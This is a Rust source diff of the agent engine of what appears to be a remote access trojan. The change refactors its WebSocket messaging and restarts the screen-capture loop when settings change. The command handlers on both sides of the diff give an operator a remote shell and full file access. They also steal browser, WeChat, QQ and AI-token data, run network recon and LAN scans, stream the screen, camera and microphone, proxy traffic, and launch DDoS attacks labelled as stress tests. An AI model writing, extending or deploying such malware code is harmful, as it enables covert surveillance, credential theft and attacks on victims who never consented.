@@ -1,17 +1,13 @@
-use std::sync::Arc;
-use tokio::sync::Mutex;
 use serde_json::Value;
 
 use libra_common::models::StressConfig;
 use libra_common::protocol::{WebSocketMessage, ws_type};
 use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
-use libra_comm::ws::WsCommunicator;
+use libra_comm::ws::{WsCommunicator, WsSender, ws_send_via, send_msg_via};
 use libra_platform::get_executor;
 
 use crate::config::ConfigManager;
-
-type WsRef = Arc<Mutex<WsCommunicator>>;
 
 struct ShellSession {
     child: tokio::process::Child,
@@ -23,7 +19,8 @@ pub struct AgentEngine {
     config: ConfigManager,
     crypto: AgentCrypto,
     http: Option<HttpCommunicator>,
-    ws: Option<WsRef>,
+    ws: Option<WsCommunicator>,  // directly owned — only the receive loop uses it
+    ws_tx: Option<WsSender>,     // cloneable send-half for spawned tasks
     agent_id: String,
     screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
 }
@@ -35,6 +32,7 @@ impl AgentEngine {
             crypto: AgentCrypto::new(),
             http: None,
             ws: None,
+            ws_tx: None,
             agent_id: String::new(),
             screen_session: std::sync::Mutex::new(None),
         }
@@ -89,7 +87,9 @@ impl AgentEngine {
                 Err(_) => tokio::time::sleep(std::time::Duration::from_secs(2)).await,
             }
         }
-        self.ws = Some(Arc::new(Mutex::new(ws)));
+        let tx = ws.sender();
+        self.ws_tx = Some(tx);
+        self.ws = Some(ws);
 
         self.main_loop().await
     }
@@ -97,7 +97,9 @@ impl AgentEngine {
     // ── Main event loop ─────────────────────────────────────────────
 
     async fn main_loop(&mut self) -> Result<(), String> {
-        let ws = self.ws.as_ref().ok_or("WS not initialized")?.clone();
+        // Take ws out of self so receive() and handle_ws_message() don't conflict
+        let mut ws = self.ws.take().ok_or("WS not initialized")?;
+        let tx = self.ws_tx.as_ref().ok_or("WS sender not initialized")?.clone();
         let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
         let agent_id = self.agent_id.clone();
         let server_url = self.config.server_url.clone();
@@ -120,7 +122,8 @@ impl AgentEngine {
             }
         });
 
-        // Main event loop: WS receive + shell output forwarding
+        // Main event loop: WS receive + shell output forwarding.
+        // The WebSocket is split: ws.receive() doesn't block sends via tx.
         loop {
             tokio::select! {
                 Some(msg) = shell_rx.recv() => {
@@ -129,14 +132,10 @@ impl AgentEngine {
                         msg.request_id.as_deref().unwrap_or("-"),
                         msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                     );
-                    let mut ws_lock = ws.lock().await;
-                    let _ = ws_lock.send(&msg).await;
+                    send_msg_via(&tx, &msg).await;
                 }
 
-                result = async {
-                    let mut ws_lock = ws.lock().await;
-                    ws_lock.receive().await
-                } => {
+                result = ws.receive() => {
                     match result {
                         Some(msg) => {
                             eprintln!("[RECV] {} | rid={} | data={}",
@@ -145,22 +144,25 @@ impl AgentEngine {
                                 msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                             );
                             self.handle_ws_message(
-                                msg, &shell_tx, &mut shell_session
+                                msg, &tx, &shell_tx, &mut shell_session
                             ).await;
                         }
                         None => {
-                            // Try reconnect
+                            // Try reconnect; re-split after connect
                             tokio::time::sleep(std::time::Duration::from_secs(3)).await;
-                            let mut ws_lock = ws.lock().await;
-                            if ws_lock.connect().await.is_err() {
+                            if ws.connect().await.is_err() {
                                 break;
                             }
+                            // Update sender after reconnect
+                            self.ws_tx = Some(ws.sender());
                         }
                     }
                 }
             }
         }
 
+        // Put ws back before returning
+        self.ws = Some(ws);
         Err("Agent main loop ended".into())
     }
 
@@ -169,10 +171,10 @@ impl AgentEngine {
     async fn handle_ws_message(
         &mut self,
         msg: WebSocketMessage,
+        tx: &WsSender,
         shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
         shell_session: &mut Option<ShellSession>,
     ) {
-        let ws = match &self.ws { Some(w) => w.clone(), None => return };
         let agent_id = self.agent_id.clone();
         let msg_type = msg.msg_type.clone();
         let data = msg.data.clone();
@@ -182,10 +184,10 @@ impl AgentEngine {
         match msg_type.as_str() {
             // ── Shell ────────────────────────────────────────────
             ws_type::SHELL_BIND => {
-                self.handle_shell_bind(&agent_id, &ws, shell_tx, shell_session, &data, rid).await;
+                self.handle_shell_bind(&agent_id, tx, shell_tx, shell_session, &data, rid).await;
             }
             ws_type::SHELL_UNBIND => {
-                self.handle_shell_unbind(&agent_id, &ws, shell_session, rid).await;
+                self.handle_shell_unbind(&agent_id, tx, shell_session, rid).await;
             }
             ws_type::SHELL_INPUT => {
                 if let Some(ref mut s) = shell_session {
@@ -204,110 +206,110 @@ impl AgentEngine {
                     .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                     .collect();
                 let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
-                ws_send(&ws, &agent_id, "file.drives.result", &json, rid).await;
+                ws_send(tx, &agent_id, "file.drives.result", &json, rid).await;
             }
             ws_type::FILE_LIST => {
                 let path = data_str(&data, "path", ".");
                 let r = libra_modules::execution::FileOps::list_directory(&path);
-                ws_send(&ws, &agent_id, "file.list.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.list.result", &r, rid).await;
             }
             ws_type::FILE_READ => {
                 let path = data_str(&data, "path", "");
                 let r = libra_modules::execution::FileOps::read_file(&path);
-                ws_send(&ws, &agent_id, "file.read.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.read.result", &r, rid).await;
             }
             ws_type::FILE_WRITE => {
                 let path = data_str(&data, "path", "");
                 let content = data_str(&data, "data", "");
                 let r = libra_modules::execution::FileOps::write_file(&path, &content);
-                ws_send(&ws, &agent_id, "file.write.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.write.result", &r, rid).await;
             }
             ws_type::FILE_DELETE => {
                 let path = data_str(&data, "path", "");
                 let r = libra_modules::execution::FileOps::delete(&path);
-                ws_send(&ws, &agent_id, "file.delete.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.delete.result", &r, rid).await;
             }
             ws_type::FILE_MKDIR => {
                 let path = data_str(&data, "path", "");
                 let r = libra_modules::execution::FileOps::create_directory(&path);
-                ws_send(&ws, &agent_id, "file.mkdir.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.mkdir.result", &r, rid).await;
             }
             ws_type::FILE_RENAME => {
                 let path = data_str(&data, "path", "");
                 let new_name = data_str(&data, "newName", "");
                 let r = libra_modules::execution::FileOps::rename(&path, &new_name);
-                ws_send(&ws, &agent_id, "file.rename.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.rename.result", &r, rid).await;
             }
             ws_type::FILE_MOVE => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
                 let r = libra_modules::execution::FileOps::move_path(&src, &dst);
-                ws_send(&ws, &agent_id, "file.move.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.move.result", &r, rid).await;
             }
             ws_type::FILE_COPY => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
                 let r = libra_modules::execution::FileOps::copy(&src, &dst);
-                ws_send(&ws, &agent_id, "file.copy.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.copy.result", &r, rid).await;
             }
             ws_type::FILE_COMPRESS => {
                 let path = data_str(&data, "path", "");
                 let r = libra_modules::execution::FileOps::compress(&path);
-                ws_send(&ws, &agent_id, "file.compress.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.compress.result", &r, rid).await;
             }
             ws_type::FILE_DECOMPRESS => {
                 let path = data_str(&data, "path", "");
                 let dest = data.as_ref().and_then(|d| d["destination"].as_str());
                 let r = libra_modules::execution::FileOps::decompress(&path, dest);
-                ws_send(&ws, &agent_id, "file.decompress.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.decompress.result", &r, rid).await;
             }
             ws_type::FILE_SHORTCUT => {
                 let path = data_str(&data, "path", "");
                 let r = libra_modules::execution::FileOps::create_shortcut(&path);
-                ws_send(&ws, &agent_id, "file.shortcut.result", &r, rid).await;
+                ws_send(tx, &agent_id, "file.shortcut.result", &r, rid).await;
             }
 
             // ── System info ──────────────────────────────────────
             ws_type::SYSTEM_PROCESSES => {
                 let r = libra_modules::recon::ProcessInfo::collect(None);
-                ws_send(&ws, &agent_id, "system.processes.result", &r, rid).await;
+                ws_send(tx, &agent_id, "system.processes.result", &r, rid).await;
             }
             ws_type::SYSTEM_WINDOWS => {
                 let r = libra_modules::recon::WindowInfo::collect();
-                ws_send(&ws, &agent_id, "system.windows.result", &r, rid).await;
+                ws_send(tx, &agent_id, "system.windows.result", &r, rid).await;
             }
             ws_type::SYSTEM_ENV => {
                 let r = libra_modules::recon::EnvInfo::collect();
-                ws_send(&ws, &agent_id, "system.env.result", &r, rid).await;
+                ws_send(tx, &agent_id, "system.env.result", &r, rid).await;
             }
             ws_type::SYSTEM_NETWORK => {
                 let r = libra_modules::recon::NetworkInfo::collect().await;
-                ws_send(&ws, &agent_id, "system.network.result", &r, rid).await;
+                ws_send(tx, &agent_id, "system.network.result", &r, rid).await;
             }
             ws_type::SYSTEM_LANSCAN => {
                 let r = libra_modules::recon::LanScan::scan().await;
-                ws_send(&ws, &agent_id, "system.lanscan.result", &r, rid).await;
+                ws_send(tx, &agent_id, "system.lanscan.result", &r, rid).await;
             }
 
             // ── Other software ────────────────────────────────────
             ws_type::OTHERSOFT_WECHAT => {
                 let r = libra_modules::recon::OtherSoftware::collect_wechat();
-                ws_send(&ws, &agent_id, "othersoft.wechat.result", &r, rid).await;
+                ws_send(tx, &agent_id, "othersoft.wechat.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_QQ => {
                 let r = libra_modules::recon::OtherSoftware::collect_qq();
-                ws_send(&ws, &agent_id, "othersoft.qq.result", &r, rid).await;
+                ws_send(tx, &agent_id, "othersoft.qq.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_BROWSER => {
                 let btype = data_str(&data, "type", "all");
                 let offset = data_u64(&data, "offset", 0) as usize;
                 let limit = data_u64(&data, "limit", 100) as usize;
                 let r = libra_modules::recon::BrowserStealer::collect(&btype, offset, limit);
-                ws_send(&ws, &agent_id, "othersoft.browser.result", &r, rid).await;
+                ws_send(tx, &agent_id, "othersoft.browser.result", &r, rid).await;
             }
             ws_type::OTHERSOFT_AI => {
                 let r = libra_modules::recon::AITokenScanner::scan();
-                ws_send(&ws, &agent_id, "othersoft.ai.result", &r, rid).await;
+                ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
             }
 
             // ── Proxy ─────────────────────────────────────────────
@@ -319,18 +321,18 @@ impl AgentEngine {
                 let r = libra_modules::execution::ProxyBrowser::fetch(
                     &url, &method, headers, body,
                 ).await;
-                ws_send(&ws, &agent_id, "proxy.fetch.result", &r, rid).await;
+                ws_send(tx, &agent_id, "proxy.fetch.result", &r, rid).await;
             }
 
             // ── Screen ─────────────────────────────────────────
             ws_type::SCREEN_LIST => {
                 let r = libra_modules::execution::ScreenCapture::list_screens();
-                ws_send(&ws, &agent_id, "screen.list.result", &r, rid).await;
+                ws_send(tx, &agent_id, "screen.list.result", &r, rid).await;
             }
             ws_type::SCREEN_BIND => {
                 // Stop any existing stream
-                if let Some(tx) = self.screen_session.lock().unwrap().take() {
-                    let _ = tx.send(true);
+                if let Some(old_tx) = self.screen_session.lock().unwrap().take() {
+                    let _ = old_tx.send(true);
                 }
 
                 let fps = data_u64(&data, "fps", 5).max(1).min(30) as u32;
@@ -339,7 +341,7 @@ impl AgentEngine {
 
                 let interval_ms = 1000u64 / fps as u64;
                 let agent_id2 = agent_id.clone();
-                let ws2 = ws.clone();
+                let tx2 = tx.clone();
                 let (cancel_tx, mut cancel_rx) = tokio::sync::watch::channel(false);
                 self.screen_session.lock().unwrap().replace(cancel_tx);
 
@@ -347,7 +349,7 @@ impl AgentEngine {
                     loop {
                         if *cancel_rx.borrow() { break; }
                         let r = libra_modules::execution::ScreenCapture::capture(&quality, Some(screen_index));
-                        ws_send(&ws2, &agent_id2, "screen.frame", &r, None).await;
+                        ws_send(&tx2, &agent_id2, "screen.frame", &r, None).await;
                         tokio::select! {
                             _ = cancel_rx.changed() => break,
                             _ = tokio::time::sleep(std::time::Duration::from_millis(interval_ms)) => {}
@@ -355,46 +357,65 @@ impl AgentEngine {
                     }
                 });
 
-                ws_send(&ws, &agent_id, "screen.bind.result", r#"{"status":"streaming"}"#, rid).await;
+                ws_send(tx, &agent_id, "screen.bind.result", r#"{"status":"streaming"}"#, rid).await;
             }
             ws_type::SCREEN_UNBIND => {
                 if let Some(tx) = self.screen_session.lock().unwrap().take() {
                     let _ = tx.send(true);
                 }
-                ws_send(&ws, &agent_id, "screen.unbind.result", r#"{"status":"ok"}"#, rid).await;
+                ws_send(tx, &agent_id, "screen.unbind.result", r#"{"status":"ok"}"#, rid).await;
             }
             ws_type::SCREEN_CONFIG => {
-                // Config updates (fps/quality/screenIndex) are handled by re-binding
-                // For now, send a single capture at the new settings
-                let quality = data_str(&data, "quality", "medium");
+                // Restart the capture loop with updated settings
+                if let Some(old_tx) = self.screen_session.lock().unwrap().take() {
+                    let _ = old_tx.send(true);
+                }
+
+                let fps = data_u64(&data, "fps", 5).max(1).min(30) as u32;
+                let quality = data_str(&data, "quality", "medium").to_string();
                 let screen_index = data_u64(&data, "screenIndex", 0) as u32;
-                let r = libra_modules::execution::ScreenCapture::capture(&quality, Some(screen_index));
-                ws_send(&ws, &agent_id, "screen.frame", &r, rid).await;
+                let interval_ms = 1000u64 / fps as u64;
+                let agent_id2 = agent_id.clone();
+                let tx2 = tx.clone();
+                let (cancel_tx, mut cancel_rx) = tokio::sync::watch::channel(false);
+                self.screen_session.lock().unwrap().replace(cancel_tx);
+
+                tokio::spawn(async move {
+                    loop {
+                        if *cancel_rx.borrow() { break; }
+                        let r = libra_modules::execution::ScreenCapture::capture(&quality, Some(screen_index));
+                        ws_send(&tx2, &agent_id2, "screen.frame", &r, None).await;
+                        tokio::select! {
+                            _ = cancel_rx.changed() => break,
+                            _ = tokio::time::sleep(std::time::Duration::from_millis(interval_ms)) => {}
+                        }
+                    }
+                });
             }
             ws_type::CAMERA_LIST => {
                 let r = libra_modules::execution::CameraCapture::list_cameras();
-                ws_send(&ws, &agent_id, "camera.list.result", &r, rid).await;
+                ws_send(tx, &agent_id, "camera.list.result", &r, rid).await;
             }
             ws_type::CAMERA_BIND | ws_type::CAMERA_CONFIG => {
                 let idx = data_u64(&data, "cameraIndex", 0) as u32;
                 let r = libra_modules::execution::CameraCapture::capture(idx);
-                ws_send(&ws, &agent_id, "camera.frame", &r, rid).await;
+                ws_send(tx, &agent_id, "camera.frame", &r, rid).await;
             }
             ws_type::CAMERA_UNBIND => {
-                ws_send(&ws, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
+                ws_send(tx, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
             }
             ws_type::MIC_LIST => {
                 let r = libra_modules::execution::MicCapture::list_devices();
-                ws_send(&ws, &agent_id, "mic.list.result", &r, rid).await;
+                ws_send(tx, &agent_id, "mic.list.result", &r, rid).await;
             }
             ws_type::MIC_BIND => {
                 let idx = data_u64(&data, "deviceIndex", 0) as u32;
                 let r = libra_modules::execution::MicCapture::start_capture(idx);
-                ws_send(&ws, &agent_id, "mic.data", &r, rid).await;
+                ws_send(tx, &agent_id, "mic.data", &r, rid).await;
             }
             ws_type::MIC_UNBIND => {
                 let r = libra_modules::execution::MicCapture::stop_capture();
-                ws_send(&ws, &agent_id, "mic.unbind.result", &r, rid).await;
+                ws_send(tx, &agent_id, "mic.unbind.result", &r, rid).await;
             }
 
             // ── Stress test ───────────────────────────────────────
@@ -416,16 +437,16 @@ impl AgentEngine {
                     let ddos = libra_modules::stress_test::DdosModule::new();
                     ddos.start(config).await;
                 }
-                ws_send(&ws, &agent_id, "stress.start.result", r#"{"status":"started"}"#, rid).await;
+                ws_send(tx, &agent_id, "stress.start.result", r#"{"status":"started"}"#, rid).await;
             }
             ws_type::STRESS_STOP => {
-                ws_send(&ws, &agent_id, "stress.stop.result", r#"{"status":"stopped"}"#, rid).await;
+                ws_send(tx, &agent_id, "stress.stop.result", r#"{"status":"stopped"}"#, rid).await;
             }
             ws_type::STRESS_STATUS => {
                 let ddos = libra_modules::stress_test::DdosModule::new();
                 let status = ddos.build_status("", &agent_id, "");
                 let json = serde_json::to_string(&status).unwrap_or_default();
-                ws_send(&ws, &agent_id, "stress.status.result", &json, rid).await;
+                ws_send(tx, &agent_id, "stress.status.result", &json, rid).await;
             }
 
             _ => {} // Unknown type — ignore
@@ -437,7 +458,7 @@ impl AgentEngine {
     async fn handle_shell_bind(
         &self,
         agent_id: &str,
-        ws: &WsRef,
+        ws_tx: &WsSender,
         shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
         shell_session: &mut Option<ShellSession>,
         _data: &Option<Value>,
@@ -456,7 +477,7 @@ impl AgentEngine {
         let stdin = match child.stdin.take() {
             Some(s) => s,
             None => {
-                ws_send(ws, agent_id, "shell.error", r#"{"error":"Cannot open stdin"}"#, rid).await;
+                ws_send(ws_tx, agent_id, "shell.error", r#"{"error":"Cannot open stdin"}"#, rid).await;
                 return;
             }
         };
@@ -464,7 +485,7 @@ impl AgentEngine {
         let stdout = child.stdout.take();
         let stderr = child.stderr.take();
         let mut cancel_rx = cancel_tx.subscribe();
-        let tx = shell_tx.clone();
+        let s_tx = shell_tx.clone();
         let aid = agent_id.to_string();
 
         // Spawn reader task for stdout/stderr
@@ -484,7 +505,7 @@ impl AgentEngine {
                                     Ok(n) => {
                                         let text = libra_platform::decode_shell_bytes(&out_buf[..n]);
                                         let json = serde_json::json!({"text": text}).to_string();
-                                        let _ = send_via_channel(&tx, &aid, "shell.output", &json, None);
+                                        let _ = send_via_channel(&s_tx, &aid, "shell.output", &json, None);
                                     }
                                     Err(_) => break,
                                 }
@@ -495,7 +516,7 @@ impl AgentEngine {
                                     Ok(n) => {
                                         let text = libra_platform::decode_shell_bytes(&err_buf[..n]);
                                         let json = serde_json::json!({"text": text}).to_string();
-                                        let _ = send_via_channel(&tx, &aid, "shell.output", &json, None);
+                                        let _ = send_via_channel(&s_tx, &aid, "shell.output", &json, None);
                                     }
                                     Err(_) => break,
                                 }
@@ -513,7 +534,7 @@ impl AgentEngine {
                                     Ok(n) => {
                                         let text = libra_platform::decode_shell_bytes(&out_buf[..n]);
                                         let json = serde_json::json!({"text": text}).to_string();
-                                        let _ = send_via_channel(&tx, &aid, "shell.output", &json, None);
+                                        let _ = send_via_channel(&s_tx, &aid, "shell.output", &json, None);
                                     }
                                     Err(_) => break,
                                 }
@@ -526,13 +547,13 @@ impl AgentEngine {
         });
 
         *shell_session = Some(ShellSession { child, stdin, cancel_tx });
-        ws_send(ws, agent_id, "shell.lock.acquired", r#"{"status":"bound"}"#, rid).await;
+        ws_send(ws_tx, agent_id, "shell.lock.acquired", r#"{"status":"bound"}"#, rid).await;
     }
 
     async fn handle_shell_unbind(
         &self,
         agent_id: &str,
-        ws: &WsRef,
+        ws_tx: &WsSender,
         shell_session: &mut Option<ShellSession>,
         rid: Option<&str>,
     ) {
@@ -540,7 +561,7 @@ impl AgentEngine {
             let _ = s.cancel_tx.send(true);
             s.child.kill().await.ok();
         }
-        ws_send(ws, agent_id, "shell.lock.released", r#"{"status":"unbound"}"#, rid).await;
+        ws_send(ws_tx, agent_id, "shell.lock.released", r#"{"status":"unbound"}"#, rid).await;
     }
 }
 
@@ -568,14 +589,13 @@ fn extract_session_key(response: &str) -> Option<Vec<u8>> {
     base64::engine::general_purpose::STANDARD.decode(b64).ok()
 }
 
-async fn ws_send(ws: &WsRef, agent_id: &str, msg_type: &str, data_str: &str, rid: Option<&str>) {
+async fn ws_send(tx: &WsSender, agent_id: &str, msg_type: &str, data_str: &str, rid: Option<&str>) {
     eprintln!("[SEND] {} | rid={} | data={}",
         msg_type,
         rid.unwrap_or("-"),
         data_str
     );
-    let mut ws_lock = ws.lock().await;
-    let _ = ws_lock.send_result_raw(msg_type, agent_id, data_str, rid).await;
+    ws_send_via(tx, agent_id, msg_type, data_str, rid).await;
 }
 
 fn send_via_channel(
